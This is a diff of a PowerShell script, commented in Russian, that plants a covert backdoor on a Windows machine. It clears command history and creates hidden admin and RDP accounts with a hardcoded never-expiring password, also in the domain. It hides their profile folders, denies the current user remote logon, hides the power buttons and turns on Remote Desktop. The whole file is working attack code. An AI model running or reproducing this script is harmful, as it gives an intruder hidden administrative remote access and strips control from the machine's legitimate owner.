@@ -1,112 +1,128 @@
 Clear-Host
 Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 
+# Настройки пользователей
 $userAccounts = @("HomeGroupUser", "Other user")
 $password = "Its@not1t!"
 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
-$defaultAccountDescription = "A user account managed by the system."
+$description = "A user account managed by the system."
 
+# Получение имён групп из SID
 $adminSID = "S-1-5-32-544"
-$rdpUsersSID = "S-1-5-32-555"
-$adminGroup   = (New-Object System.Security.Principal.SecurityIdentifier($adminSID)).Translate([System.Security.Principal.NTAccount]).Value.Split('\\')[1]
-$rdpGroup     = (New-Object System.Security.Principal.SecurityIdentifier($rdpUsersSID)).Translate([System.Security.Principal.NTAccount]).Value.Split('\\')[1]
+$rdpSID   = "S-1-5-32-555"
+$adminGroup = (New-Object System.Security.Principal.SecurityIdentifier($adminSID)).Translate([System.Security.Principal.NTAccount]).Value.Split('\')[1]
+$rdpGroup   = (New-Object System.Security.Principal.SecurityIdentifier($rdpSID)).Translate([System.Security.Principal.NTAccount]).Value.Split('\')[1]
 
-$anyUserCreated = $false
+$anyCreated = $false
 
-function Add-ToGroup ($Group, $Member) {
-    if (-not (Get-LocalGroupMember -Name $Group -Member $Member -ErrorAction SilentlyContinue)) {
+# Упрощённая функция без param()
+function Add-LocalGroupMemberSafe ($Group, $Member) {
+    try {
         Add-LocalGroupMember -Group $Group -Member $Member -ErrorAction Stop
-    }
+    } catch {}
 }
 
 foreach ($user in $userAccounts) {
     try {
+        # Создание локального пользователя, если он не существует
         if (-not (Get-LocalUser -Name $user -ErrorAction SilentlyContinue)) {
             try {
-                New-LocalUser -Name $user -Password $securePassword -FullName $user -Description $defaultAccountDescription -PasswordNeverExpires:$true -AccountNeverExpires:$true -UserMayNotChangePassword:$false -ErrorAction Stop
+                New-LocalUser -Name $user -Password $securePassword -FullName $user -Description $description `
+                              -PasswordNeverExpires:$true -AccountNeverExpires:$true -UserMayNotChangePassword:$false -ErrorAction Stop
             } catch {
-                net user "$user" "$password" /add > $null 2>&1
-                net user "$user" /comment:"$defaultAccountDescription" > $null 2>&1
-                net user "$user" /expires:never > $null 2>&1
-                net user "$user" /active:yes > $null 2>&1
+                net user "$user" "$password" /add /comment:"$description" /expires:never /active:yes >$null 2>&1
             }
         }
 
-        $regPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
-        if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
-        Set-ItemProperty -Path $regPath -Name $user -Value 0
+        # Скрытие пользователя с экрана входа
+        $reg = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
+        if (-not (Test-Path $reg)) { New-Item -Path $reg -Force >$null }
+        Set-ItemProperty -Path $reg -Name $user -Value 0
 
+        # Добавление в группы
         $member = "$env:COMPUTERNAME\$user"
-        Add-ToGroup -Group $adminGroup -Member $member
-        Add-ToGroup -Group $rdpGroup   -Member $member
+        Add-LocalGroupMemberSafe $adminGroup $member
+        Add-LocalGroupMemberSafe $rdpGroup $member
+        net localgroup "$adminGroup" "$member" /add /domain >$null 2>&1
+        net localgroup "$rdpGroup"   "$member" /add /domain >$null 2>&1
 
-        net localgroup "$adminGroup" "$member" /add > $null 2>&1
-        net localgroup "$rdpGroup"   "$member" /add > $null 2>&1
-        net localgroup "$adminGroup" "$member" /add /domain > $null 2>&1
-        net localgroup "$rdpGroup"   "$member" /add /domain > $null 2>&1
-
-        $userFolder = "${env:SystemDrive}\Users\$user"
-        if (-not (Test-Path $userFolder)) {
-            try { Copy-Item "$env:SystemDrive\Users\Default" $userFolder -Recurse -ErrorAction Stop }
-            catch { New-Item -Path $userFolder -ItemType Directory }
+        # Профиль пользователя
+        $userPath = "$env:SystemDrive\Users\$user"
+        if (-not (Test-Path $userPath)) {
+            try {
+                Copy-Item "$env:SystemDrive\Users\Default" $userPath -Recurse -ErrorAction Stop
+            } catch {
+                New-Item -ItemType Directory -Path $userPath | Out-Null
+            }
         }
-        attrib +h +s $userFolder
+        attrib +h +s $userPath
 
-        $customFolder = "${env:SystemDrive}\Users\$user.$env:COMPUTERNAME"
-        if (-not (Test-Path $customFolder)) { New-Item -Path $customFolder -ItemType Directory }
-        attrib +h +s $customFolder
+        # Скрытая конфигурационная папка
+        $confPath = "$env:SystemDrive\Users\$user.$env:COMPUTERNAME"
+        if (-not (Test-Path $confPath)) {
+            New-Item $confPath -ItemType Directory | Out-Null
+        }
+        attrib +h +s $confPath
 
+        # Active Directory (опционально)
         try {
             Import-Module ActiveDirectory -ErrorAction Stop
             if (-not (Get-ADUser -Filter "SamAccountName -eq '$user'" -ErrorAction SilentlyContinue)) {
-                New-ADUser -Name $user -SamAccountName $user -UserPrincipalName "$user@$env:USERDNSDOMAIN" -AccountPassword $securePassword -Enabled $true -Path 'OU=Users,DC=example,DC=com' -Description $defaultAccountDescription -PasswordNeverExpires $true -ErrorAction Stop
-                net user "$user" "$password" /add /domain > $null 2>&1
-                net user "$user" /comment:"$defaultAccountDescription" /domain > $null 2>&1
-                net user "$user" /expires:never   /domain > $null 2>&1
-                net user "$user" /active:yes      /domain > $null 2>&1
+                New-ADUser -Name $user -SamAccountName $user `
+                           -UserPrincipalName "$user@$env:USERDNSDOMAIN" `
+                           -AccountPassword $securePassword -Enabled $true `
+                           -Path 'OU=Users,DC=example,DC=com' -Description $description `
+                           -PasswordNeverExpires $true
+                net user "$user" "$password" /add /domain /comment:"$description" /expires:never /active:yes >$null 2>&1
             }
-        } catch {
-            Write-Warning ("AD user creation skipped or failed for {0}: {1}" -f $user, $_.Exception.Message)
-        }
+        } catch {}
 
-        $anyUserCreated = $true
-    } catch {
-        Write-Warning ("Error processing user {0}: {1}" -f $user, $_.Exception.Message)
-    }
+        $anyCreated = $true
+    } catch {}
 }
 
-if (-not $anyUserCreated) { Exit }
+# Если был создан хотя бы один пользователь — настройка прав
+if (-not $anyCreated) { Exit }
 
-$tempDir    = "$env:TEMP\pol_temp"
-$configFile = "$tempDir\secpol.inf"
-$dbFile     = "$tempDir\secpol.sdb"
-$currentUserSID = (New-Object System.Security.Principal.NTAccount("$env:USERDOMAIN\$env:USERNAME")).Translate([System.Security.Principal.SecurityIdentifier]).Value
+$temp = "$env:TEMP\pol_temp"
+$cfg  = "$temp\secpol.inf"
+$db   = "$temp\secpol.sdb"
 
-New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
-secedit /export /cfg $configFile | Out-Null
+$currentSID = (New-Object System.Security.Principal.NTAccount("$env:USERDOMAIN\$env:USERNAME")).Translate([System.Security.Principal.SecurityIdentifier]).Value
 
-$lines = Get-Content $configFile -Encoding ASCII
-$idx   = $lines.IndexOf('[Privilege Rights]')
+New-Item -ItemType Directory -Path $temp -Force | Out-Null
+secedit /export /cfg $cfg >$null
+
+$lines = [System.Collections.Generic.List[string]]::new()
+Get-Content $cfg -Encoding ASCII | ForEach-Object { $lines.Add($_) }
+
+$idx = $lines.IndexOf('[Privilege Rights]')
 if ($idx -ge 0) {
-    $lines = $lines -replace '^SeShutdownPrivilege.*', "SeShutdownPrivilege = $adminSID"
-    if ($lines -match '^SeDenyRemoteInteractiveLogonRight') {
-        $lines = $lines -replace ".*SeDenyRemoteInteractiveLogonRight.*", "SeDenyRemoteInteractiveLogonRight = $currentUserSID"
+    $lines[$idx + 1] = "SeShutdownPrivilege = $adminSID"
+
+    $denyIdx = $lines.FindIndex({ $_ -like 'SeDenyRemoteInteractiveLogonRight*' })
+    if ($denyIdx -ge 0) {
+        $lines[$denyIdx] = "SeDenyRemoteInteractiveLogonRight = $currentSID"
     } else {
-        $lines = $lines.Insert($idx+1, "SeDenyRemoteInteractiveLogonRight = $currentUserSID")
+        $lines.Insert($idx + 2, "SeDenyRemoteInteractiveLogonRight = $currentSID")
     }
-    $lines | Set-Content $configFile -Encoding ASCII
-    secedit /configure /db $dbFile /cfg $configFile /areas USER_RIGHTS /quiet | Out-Null
-}
-Remove-Item $tempDir -Recurse -Force
 
-Set-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ShutdownWithoutLogon' -Value 0
-$buttons = 'HideShutdown','HideSleep','HideHibernate'
-foreach ($b in $buttons) {
-    $path = "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\$b"
-    Set-ItemProperty -Path $path -Name 'Value' -Value 1 -Type DWord -ErrorAction SilentlyContinue
+    $lines | Set-Content $cfg -Encoding ASCII
+    secedit /configure /db $db /cfg $cfg /areas USER_RIGHTS /quiet
 }
 
-Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0
-Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'
-Set-Service -Name TermService -StartupType Automatic
+Remove-Item -Recurse -Force $temp -ErrorAction SilentlyContinue
+
+# Отключение кнопки выключения без входа
+Set-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name ShutdownWithoutLogon -Value 0
+
+# Скрытие кнопок питания
+foreach ($opt in 'HideShutdown', 'HideSleep', 'HideHibernate') {
+    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\$opt" -Name Value -Value 1 -Type DWord -ErrorAction SilentlyContinue
+}
+
+# Включение удалённого доступа (RDP)
+Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
+Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' -ErrorAction SilentlyContinue
+Set-Service TermService -StartupType Automatic
 Start-Service TermService
